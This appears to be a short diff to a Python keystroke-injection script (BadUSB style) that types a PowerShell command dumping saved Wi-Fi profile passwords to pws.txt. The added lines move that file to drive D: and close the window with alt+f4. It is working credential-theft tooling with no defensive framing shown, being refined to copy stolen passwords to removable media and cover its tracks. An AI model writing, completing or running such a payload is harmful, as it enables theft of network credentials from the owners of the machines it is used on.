@@ -38,12 +38,13 @@ write("""netsh wlan show profile |
             Password = $passw.Matches.Value
         }
     } > pws.txt""")
-sleep(1)
+sleep(2)
 
 press_and_release("enter")
-sleep(0.7)
+sleep(1)
 
-press_and_release("win+up")
-sleep(0.5)
+write("mv 'pws.txt' D:")
+press_and_release("enter")
+sleep(5)
 
-# Here I want to save the output into pws.txt
+press_and_release("alt+f4")
